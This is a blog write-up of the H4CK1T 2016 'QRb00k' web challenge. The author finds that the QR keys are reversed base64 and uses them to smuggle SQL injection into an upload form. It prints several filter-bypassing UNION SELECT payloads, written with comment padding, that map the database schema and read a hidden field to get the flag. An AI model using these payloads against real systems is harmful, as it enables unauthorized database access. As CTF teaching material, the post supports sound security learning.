---
title: '[H4CK1T 2016] QRb00k – Russia Writeup'
author: Megabeets
type: post
date: 2016-10-03T00:35:37+00:00
url: /h4ck1t-2016-qrb00k-russia-writeup/
categories:
  - H4CK1T CTF 2016
  - Writeups
tags:
  - CTF
  - H4CK1T
  - Web
  - Writeups

---
### **Description:**

> **Task: QRb00k &#8211; Russia &#8211; W3b &#8211; 400**  
> <span style="font-weight: 400;">The secured messenger was developed in Canada, it&#8217;s using systems with qr keys for communicating, it allows to read other people&#8217;s messages only to this key holders. But is it true? And you have to figure it out &#8230;</span>  
> [<span style="font-weight: 400;">http://hack-quest.com</span>][1]

This was a very good web challenge. It took me quite a time to fully understand it but was absolutely worth of its 400 points.

Starting the challenge we are given with a messenger site that uses QR codes to communicate. The site has two main pages:

  * Create &#8211; which creates QR code from a given name and message
  * Read &#8211; an upload form to upload QR code and read the message inside

So let&#8217;s create a message:

<img data-attachment-id="605" data-permalink="https://www.megabeets.net/h4ck1t-2016-qrb00k-russia-writeup/h4ck1t_russia_1/#main" data-orig-file="http://www.megabeets.net/uploads/h4ck1t_russia_1.png" data-orig-size="757,674" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="h4ck1t_russia_1" data-image-description="" data-image-caption="" data-medium-file="http://www.megabeets.net/uploads/h4ck1t_russia_1-300x267.png" data-large-file="http://www.megabeets.net/uploads/h4ck1t_russia_1.png" decoding="async" loading="lazy" class="alignnone wp-image-605 size-full" src="http://www.megabeets.net/uploads/h4ck1t_russia_1.png" width="757" height="674" srcset="https://www.megabeets.net/uploads/h4ck1t_russia_1.png 757w, https://www.megabeets.net/uploads/h4ck1t_russia_1-150x134.png 150w, https://www.megabeets.net/uploads/h4ck1t_russia_1-300x267.png 300w" sizes="(max-width: 757px) 100vw, 757px" /> 

We got a QR code which is the key to read our message:

<img data-attachment-id="606" data-permalink="https://www.megabeets.net/h4ck1t-2016-qrb00k-russia-writeup/h4ck1t_russia_2/#main" data-orig-file="http://www.megabeets.net/uploads/h4ck1t_russia_2.png" data-orig-size="523,563" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="h4ck1t_russia_2" data-image-description="" data-image-caption="" data-medium-file="http://www.megabeets.net/uploads/h4ck1t_russia_2-279x300.png" data-large-file="http://www.megabeets.net/uploads/h4ck1t_russia_2.png" decoding="async" loading="lazy" class="alignnone wp-image-606 size-medium" src="http://www.megabeets.net/uploads/h4ck1t_russia_2-279x300.png" width="279" height="300" srcset="https://www.megabeets.net/uploads/h4ck1t_russia_2-279x300.png 279w, https://www.megabeets.net/uploads/h4ck1t_russia_2-139x150.png 139w, https://www.megabeets.net/uploads/h4ck1t_russia_2.png 523w" sizes="(max-width: 279px) 100vw, 279px" /> 

Now let&#8217;s read the message using the QR code:

<img data-attachment-id="607" data-permalink="https://www.megabeets.net/h4ck1t-2016-qrb00k-russia-writeup/h4ck1t_russia_3/#main" data-orig-file="http://www.megabeets.net/uploads/h4ck1t_russia_3.png" data-orig-size="535,592" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="h4ck1t_russia_3" data-image-description="" data-image-caption="" data-medium-file="http://www.megabeets.net/uploads/h4ck1t_russia_3-271x300.png" data-large-file="http://www.megabeets.net/uploads/h4ck1t_russia_3.png" decoding="async" loading="lazy" class="alignnone wp-image-607 size-medium" src="http://www.megabeets.net/uploads/h4ck1t_russia_3-271x300.png" width="271" height="300" srcset="https://www.megabeets.net/uploads/h4ck1t_russia_3-271x300.png 271w, https://www.megabeets.net/uploads/h4ck1t_russia_3-136x150.png 136w, https://www.megabeets.net/uploads/h4ck1t_russia_3.png 535w" sizes="(max-width: 271px) 100vw, 271px" /> 

&nbsp;

Ok, it all worked as it supposed to. I used the [zxing][2] service to view the content of the QR code:

<img data-attachment-id="608" data-permalink="https://www.megabeets.net/h4ck1t-2016-qrb00k-russia-writeup/h4ck1t_russia_4/#main" data-orig-file="http://www.megabeets.net/uploads/h4ck1t_russia_4.png" data-orig-size="815,248" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="h4ck1t_russia_4" data-image-description="" data-image-caption="" data-medium-file="http://www.megabeets.net/uploads/h4ck1t_russia_4-300x91.png" data-large-file="http://www.megabeets.net/uploads/h4ck1t_russia_4.png" decoding="async" loading="lazy" class="alignnone size-full wp-image-608" src="http://www.megabeets.net/uploads/h4ck1t_russia_4.png" alt="h4ck1t_russia_4" width="815" height="248" srcset="https://www.megabeets.net/uploads/h4ck1t_russia_4.png 815w, https://www.megabeets.net/uploads/h4ck1t_russia_4-150x46.png 150w, https://www.megabeets.net/uploads/h4ck1t_russia_4-300x91.png 300w, https://www.megabeets.net/uploads/h4ck1t_russia_4-768x234.png 768w, https://www.megabeets.net/uploads/h4ck1t_russia_4-800x243.png 800w" sizes="(max-width: 815px) 100vw, 815px" /> 

Look at the raw text. It&#8217;s a short string that looks like it was base64 encoded. But wait, base64 can&#8217;t begin with &#8220;==&#8221;! Those characters usually appear at the end of base64 encoded strings. Is it reversed? Let&#8217;s check:

<pre class="lang:python decode:true ">&gt;&gt;&gt; "==QehRXS"[::-1].decode('base64')
'Itay'</pre>

Yes! it indeed was reversed. our key (QR code) is created by: QR(Reverse(Base64(name))).

Ok, now that we understand the mechanics we can let the party begin and start playing with SQL Injection. In order to create the QR codes I used [this][3] site, It was faster than using the challenge site.

I began with the obvious: &#8216; or 1=1&#8211;

<img data-attachment-id="612" data-permalink="https://www.megabeets.net/h4ck1t-2016-qrb00k-russia-writeup/h4ck1t_russia_5/#main" data-orig-file="http://www.megabeets.net/uploads/h4ck1t_russia_5.png" data-orig-size="658,381" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="h4ck1t_russia_5" data-image-description="" data-image-caption="" data-medium-file="http://www.megabeets.net/uploads/h4ck1t_russia_5-300x174.png" data-large-file="http://www.megabeets.net/uploads/h4ck1t_russia_5.png" decoding="async" loading="lazy" class="alignnone size-full wp-image-612" src="http://www.megabeets.net/uploads/h4ck1t_russia_5.png" alt="h4ck1t_russia_5" width="658" height="381" srcset="https://www.megabeets.net/uploads/h4ck1t_russia_5.png 658w, https://www.megabeets.net/uploads/h4ck1t_russia_5-150x87.png 150w, https://www.megabeets.net/uploads/h4ck1t_russia_5-300x174.png 300w" sizes="(max-width: 658px) 100vw, 658px" /> 

Whoops, Busted. The system recognized my SQLi attack. I tried some filter bypassing methods and succeeded with this input:

<pre class="lang:mysql decode:true">'/*..*/union/*..*/select/*..*/database()/*..*/union/*..*/select/*..*/'Megabeets</pre>

<span style="font-size: 8pt;">Reverse(Base64(input)) == &#8220;==wc0VWZiF2Zl10JvoiLuoyL0NWZsV2cvoiLuoyLu9WauV3Lq4iLq8SKoU2chJWY0FGZvoiLuoyL0NWZsV2cvoiLuoyLu9WauV3Lq4iLq8yJ&#8221;</span>

<img data-attachment-id="614" data-permalink="https://www.megabeets.net/h4ck1t-2016-qrb00k-russia-writeup/h4ck1t_russia_6/#main" data-orig-file="http://www.megabeets.net/uploads/h4ck1t_russia_6.png" data-orig-size="1466,684" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="h4ck1t_russia_6" data-image-description="" data-image-caption="" data-medium-file="http://www.megabeets.net/uploads/h4ck1t_russia_6-300x140.png" data-large-file="http://www.megabeets.net/uploads/h4ck1t_russia_6-1024x478.png" decoding="async" loading="lazy" class="alignnone size-large wp-image-614" src="http://www.megabeets.net/uploads/h4ck1t_russia_6-1024x478.png" alt="h4ck1t_russia_6" width="687" height="321" srcset="https://www.megabeets.net/uploads/h4ck1t_russia_6-1024x478.png 1024w, https://www.megabeets.net/uploads/h4ck1t_russia_6-150x70.png 150w, https://www.megabeets.net/uploads/h4ck1t_russia_6-300x140.png 300w, https://www.megabeets.net/uploads/h4ck1t_russia_6-768x358.png 768w, https://www.megabeets.net/uploads/h4ck1t_russia_6-800x373.png 800w, https://www.megabeets.net/uploads/h4ck1t_russia_6.png 1466w" sizes="(max-width: 687px) 100vw, 687px" /> 

It worked! now let&#8217;s find the correct table (&#8220;messages&#8221;) and column by using some queries to map the database:

<span style="font-size: 8pt;">QR(Reverse(Base64(input))) == &#8220;zRXZlJWYnVWTn8iKu4iKvQ3YlxWZz9iKu4iKv42bp5WdvoiLuoyLnMXZnF2czVWbn8iKu4iKvU2apx2Lq4iLq8SZtFmbfVGbiFGdvoiLuoyLlJXZod3Lq4iLq8ycu1Wds92YuEWblh2Yz9lbvlGdh1mcvZmbp9iKu4iKv02byZ2Lq4iLq8SKl1WYu9lbtVHbvNGK0F2Yu92YfBXdvJ3ZvoiLuoyL0NWZsV2cvoiLuoyLu9WauV3Lq4iLq8yJ&#8221;</span>

<pre class="lang:mysql decode:true">'/*..*/union/*..*/select/*..*/group_concat(column_name)/*..*/from/*..*/information_schema.columns/*..*/where/*..*/table_name/*..*/like/*..*/'messages'/*..*/union/*..*/select/*..*/'Megabeets</pre>

<img data-attachment-id="617" data-permalink="https://www.megabeets.net/h4ck1t-2016-qrb00k-russia-writeup/h4ck1t_russia_7/#main" data-orig-file="http://www.megabeets.net/uploads/h4ck1t_russia_7.png" data-orig-size="1199,795" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="h4ck1t_russia_7" data-image-description="" data-image-caption="" data-medium-file="http://www.megabeets.net/uploads/h4ck1t_russia_7-300x199.png" data-large-file="http://www.megabeets.net/uploads/h4ck1t_russia_7-1024x679.png" decoding="async" loading="lazy" class="alignnone size-large wp-image-617" src="http://www.megabeets.net/uploads/h4ck1t_russia_7-1024x679.png" alt="h4ck1t_russia_7" width="687" height="456" srcset="https://www.megabeets.net/uploads/h4ck1t_russia_7-1024x679.png 1024w, https://www.megabeets.net/uploads/h4ck1t_russia_7-150x99.png 150w, https://www.megabeets.net/uploads/h4ck1t_russia_7-300x199.png 300w, https://www.megabeets.net/uploads/h4ck1t_russia_7-768x509.png 768w, https://www.megabeets.net/uploads/h4ck1t_russia_7-800x530.png 800w, https://www.megabeets.net/uploads/h4ck1t_russia_7.png 1199w" sizes="(max-width: 687px) 100vw, 687px" /> 

&#8220;secret_field&#8221;? Sounds suspicious. Let&#8217;s query it and see what it contains:

<pre class="lang:mysql decode:true ">'/*..*/union/*..*/select/*..*/secret_field/*..*/from/*..*/messages/*..*/union/*..*/select/*..*/'Megabeets</pre>

<img data-attachment-id="618" data-permalink="https://www.megabeets.net/h4ck1t-2016-qrb00k-russia-writeup/h4ck1t_russia_8/#main" data-orig-file="http://www.megabeets.net/uploads/h4ck1t_russia_8.png" data-orig-size="1026,745" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="h4ck1t_russia_8" data-image-description="" data-image-caption="" data-medium-file="http://www.megabeets.net/uploads/h4ck1t_russia_8-300x218.png" data-large-file="http://www.megabeets.net/uploads/h4ck1t_russia_8-1024x744.png" decoding="async" loading="lazy" class="alignnone size-large wp-image-618" src="http://www.megabeets.net/uploads/h4ck1t_russia_8-1024x744.png" alt="h4ck1t_russia_8" width="687" height="499" srcset="https://www.megabeets.net/uploads/h4ck1t_russia_8-1024x744.png 1024w, https://www.megabeets.net/uploads/h4ck1t_russia_8-150x109.png 150w, https://www.megabeets.net/uploads/h4ck1t_russia_8-300x218.png 300w, https://www.megabeets.net/uploads/h4ck1t_russia_8-768x558.png 768w, https://www.megabeets.net/uploads/h4ck1t_russia_8-800x581.png 800w, https://www.megabeets.net/uploads/h4ck1t_russia_8.png 1026w" sizes="(max-width: 687px) 100vw, 687px" /> 

And we got the flag! I honestly really enjoyed this challenge.

**Flag: **_h4ck1t{I\_h@ck3d\_qR_m3Ss@g3r}_

&nbsp;

If you have any questions feel free to ask 🙂

<div class="nf-post-footer">
  <p style="text-align: right">
    <a href="https://www.megabeets.net/about.html#vegan"><img class="wp-image-149 alignnone" src="https://www.megabeets.net/uploads/megabeets_inline_logo.png" alt="megabeets_inline_logo" width="61" height="45" />Eat Veggies</a>
  </p>
</div>

 [1]: http://hack-quest.com/
 [2]: https://zxing.org/w/decode.jspx
 [3]: https://www.the-qrcode-generator.com/